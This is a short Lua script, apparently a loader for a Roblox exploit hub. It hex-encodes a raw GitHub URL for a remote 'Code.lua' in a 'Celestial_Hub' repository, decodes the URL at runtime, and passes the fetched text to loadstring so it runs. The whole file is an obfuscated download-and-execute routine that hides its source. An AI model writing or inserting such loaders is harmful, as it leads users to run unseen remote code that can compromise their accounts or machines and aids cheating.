local parts = {
    "68747470733a2f2f7261772e6769746875",
    "6275736572636f6e74656e742e636f6d2f",
    "737461733135322f43656c65737469616c",
    "5f4875622f726566732f68656164732f6d",
    "61696e2f436f64652e6c7561"
}

local function build(...)
    local t = {...}
    local result = ""
    for i = 1, #t do
        for j = 1, #t[i], 2 do
            result = result .. string.char(tonumber(t[i]:sub(j, j+1), 16))
        end
    end
    return result
end

local url = build(table.unpack(parts))
loadstring(game:HttpGet(url))
